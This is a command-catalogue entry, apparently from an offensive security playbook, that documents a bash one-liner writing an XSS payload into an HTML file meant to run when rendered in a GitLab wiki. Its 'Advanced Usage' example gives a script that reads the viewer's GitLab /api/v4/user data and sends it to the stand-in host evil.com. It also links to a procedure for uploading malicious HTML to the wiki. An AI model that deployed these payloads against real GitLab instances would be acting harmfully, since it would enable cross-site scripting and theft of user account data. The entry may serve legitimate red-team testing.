---
id: cmd-003
data: echo "<script>alert('Hello world!');</script>" > index.html
tags:
  - xss
  - file-creation
  - payload
type: command
output: File index.html created or overwritten
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:37.753Z'
verified: false
validated: true
submitted: true
---
# create-xss-html-file

## Command

```bash
echo "<script>alert('Hello world!');</script>" > index.html
```

## Description

Creates or overwrites an HTML file with a basic XSS payload using an inline script tag, which will execute when rendered in GitLab's wiki.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| > index.html | Redirection to target file | Yes |
| "<script>alert('Hello world!');</script>" | XSS payload string | Yes |

## Examples

### Basic Usage

```bash
echo "<script>alert('Hello world!');</script>" > index.html
```

### Advanced Usage

```bash
echo "<script>fetch('/api/v4/user').then(r=>r.text()).then(t=>fetch('http://evil.com?t='+t));</script>" > exploit.html
```

## Expected Output

File created; ls shows index.html, cat displays the script content.

## Related

- [[Related Procedure: Upload-Malicious-HTML-to-GitLab-Wiki]]
